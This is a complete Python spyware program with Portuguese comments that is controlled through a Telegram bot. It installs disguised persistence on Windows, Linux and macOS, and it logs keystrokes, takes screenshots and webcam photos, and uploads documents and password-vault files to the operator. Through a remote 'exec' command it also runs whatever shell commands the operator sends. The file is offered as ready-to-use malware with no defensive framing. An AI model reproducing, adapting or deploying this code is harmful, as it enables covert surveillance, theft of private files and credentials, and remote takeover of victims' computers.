# spyware_multiplataforma.py - Versão 2.4.1 - C2 via Telegram
# Requisitos: pip install opencv-python pillow requests pynput cryptography

import os
import sys
import platform
import time
import threading
import json
import subprocess
import requests
from datetime import datetime
from PIL import ImageGrab
from pynput import keyboard
from cryptography.fernet import Fernet

# ============================================================
# CONFIGURAÇÕES (substitua pelos seus dados)
# ============================================================
TELEGRAM_TOKEN = ""
TELEGRAM_CHAT_ID = ""
SISTEMA = platform.system()
PASTA_OCULTA = os.path.join(
    os.environ.get('APPDATA', '/var/tmp') if SISTEMA == 'Windows' else '/var/tmp',
    '.system_logs'
)
CHAVE_FERNET = Fernet.generate_key()
FERNET = Fernet(CHAVE_FERNET)

# ============================================================
# PERSISTÊNCIA
# ============================================================
def criar_persistencia():
    if SISTEMA == 'Windows':
        cmd = (
            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
            f'/v "WindowsSecurity" /t REG_SZ /d "{sys.executable} {__file__}" /f'
        )
        subprocess.run(cmd, shell=True, capture_output=True)
    elif SISTEMA == 'Linux':
        rc_path = os.path.expanduser('~/.config/autostart/systemd-helper.desktop')
        os.makedirs(os.path.dirname(rc_path), exist_ok=True)
        with open(rc_path, 'w') as f:
            f.write(
                f'[Desktop Entry]\n'
                f'Type=Application\n'
                f'Exec={sys.executable} {__file__}\n'
                f'Hidden=true\n'
                f'NoDisplay=true\n'
                f'X-GNOME-Autostart-enabled=true\n'
            )
    elif SISTEMA == 'Darwin':
        plist = os.path.expanduser('~/Library/LaunchAgents/com.apple.softwareupdate.plist')
        with open(plist, 'w') as f:
            f.write(
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                f'"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
                f'<plist version="1.0">\n'
                f'<dict>\n'
                f'  <key>Label</key>\n'
                f'  <string>com.apple.softwareupdate</string>\n'
                f'  <key>ProgramArguments</key>\n'
                f'  <array>\n'
                f'    <string>{sys.executable}</string>\n'
                f'    <string>{__file__}</string>\n'
                f'  </array>\n'
                f'  <key>RunAtLoad</key>\n'
                f'  <true/>\n'
                f'</dict>\n'
                f'</plist>\n'
            )
        subprocess.run(['launchctl', 'load', plist], capture_output=True)

# ============================================================
# METADADOS
# ============================================================
def coletar_metadata():
    try:
        ip_interno = subprocess.run(
            ['ipconfig'] if SISTEMA == 'Windows' else ['hostname', '-I'],
            capture_output=True, text=True, timeout=5
        ).stdout.strip()
    except:
        ip_interno = "N/A"
    return {
        "hostname": platform.node(),
        "sistema": SISTEMA,
        "versao": platform.version(),
        "maquina": platform.machine(),
        "ip_interno": ip_interno,
        "usuario": os.getlogin(),
        "pasta_usuario": os.path.expanduser('~')
    }

# ============================================================
# KEYLOGGER
# ============================================================
class KeyLogger:
    def __init__(self):
        self.log = ""
        self.ativo = True

    def callback(self, key):
        if not self.ativo:
            return
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]
            else:
                self.log += f"[{key.name}]"
        if len(self.log) >= 500:
            enviar_dados("keylog", self.log)
            self.log = ""

    def iniciar(self):
        with keyboard.Listener(on_press=self.callback) as listener:
            listener.join()

# ============================================================
# CAPTURAS
# ============================================================
def capturar_tela():
    try:
        imagem = ImageGrab.grab()
        caminho = os.path.join(PASTA_OCULTA, f"screen_{int(time.time())}.jpg")
        imagem.save(caminho, "JPEG", quality=60)
        return caminho
    except Exception:
        return None

def capturar_webcam():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            caminho = os.path.join(PASTA_OCULTA, f"webcam_{int(time.time())}.jpg")
            cv2.imwrite(caminho, frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
            cap.release()
            return caminho
        cap.release()
        return None
    except Exception:
        return None

# ============================================================
# EXFILTRAÇÃO DE ARQUIVOS
# ============================================================
def buscar_arquivos():
    alvos = ('.docx', '.xlsx', '.pdf', '.txt', '.zip', '.rar', '.jpg', '.png', '.db', '.kdbx')
    arquivos = []
    for root, _, files in os.walk(os.path.expanduser('~')):
        for file in files:
            if file.lower().endswith(alvos):
                caminho = os.path.join(root, file)
                try:
                    if os.path.getsize(caminho) < 10 * 1024 * 1024:
                        arquivos.append(caminho)
                except OSError:
                    continue
            if len(arquivos) >= 10:
                break
        if len(arquivos) >= 10:
            break
    return arquivos[:5]

# ============================================================
# ENVIO TELEGRAM
# ============================================================
def enviar_dados(tipo, conteudo):
    try:
        if tipo == "texto":
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": str(conteudo)[:4096],
                "parse_mode": "HTML"
            }
            requests.post(url, data=payload, timeout=10)
        elif tipo == "arquivo":
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
            with open(conteudo, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': TELEGRAM_CHAT_ID}
                requests.post(url, files=files, data=data, timeout=20)
        elif tipo == "keylog":
            texto_cript = FERNET.encrypt(conteudo.encode()).decode()
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": f"KEYLOG_CRIPTO:\n{texto_cript}"
            }
            requests.post(url, data=payload, timeout=10)
    except Exception:
        pass

# ============================================================
# COMANDOS REMOTOS
# ============================================================
def processar_comandos():
    ultimo_comando = None
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
            resp = requests.get(url, timeout=10).json()
            if 'result' in resp and resp['result']:
                ultimo = resp['result'][-1]
                if 'message' in ultimo and 'text' in ultimo['message']:
                    cmd = ultimo['message']['text'].strip().lower()
                    if cmd != ultimo_comando:
                        ultimo_comando = cmd
                        if cmd == "screen":
                            arq = capturar_tela()
                            if arq:
                                enviar_dados("arquivo", arq)
                        elif cmd == "webcam":
                            arq = capturar_webcam()
                            if arq:
                                enviar_dados("arquivo", arq)
                        elif cmd.startswith("download "):
                            arquivo = cmd.replace("download ", "").strip()
                            if os.path.exists(arquivo):
                                enviar_dados("arquivo", arquivo)
                        elif cmd.startswith("exec "):
                            comando = cmd.replace("exec ", "").strip()
                            saida = subprocess.run(
                                comando, shell=True,
                                capture_output=True, text=True, timeout=30
                            )
                            enviar_dados(
                                "texto",
                                f"RESULTADO:\n{saida.stdout + saida.stderr}"
                            )
                        elif cmd == "kill":
                            enviar_dados("texto", "SPYWARE DESLIGADO")
                            sys.exit(0)
        except Exception:
            pass
        time.sleep(60)

# ============================================================
# MAIN
# ============================================================
def main():
    os.makedirs(PASTA_OCULTA, exist_ok=True)
    criar_persistencia()

    # Envia metadata inicial
    enviar_dados("texto", f"SPYWARE ATIVO\n{json.dumps(coletar_metadata(), indent=2)}")

    # Keylogger em thread
    kl = KeyLogger()
    threading.Thread(target=kl.iniciar, daemon=True).start()

    # Comandos em thread
    threading.Thread(target=processar_comandos, daemon=True).start()

    # Loop principal
    while True:
        try:
            # Tela a cada 30s
            arq = capturar_tela()
            if arq:
                enviar_dados("arquivo", arq)

            # Webcam a cada 5min
            if int(time.time()) % 300 < 5:
                arq = capturar_webcam()
                if arq:
                    enviar_dados("arquivo", arq)

            # Arquivos a cada 10min
            if int(time.time()) % 600 < 10:
                for arq in buscar_arquivos():
                    enviar_dados("arquivo", arq)

            time.sleep(30)
        except Exception:
            time.sleep(30)

if __name__ == "__main__":
    main()
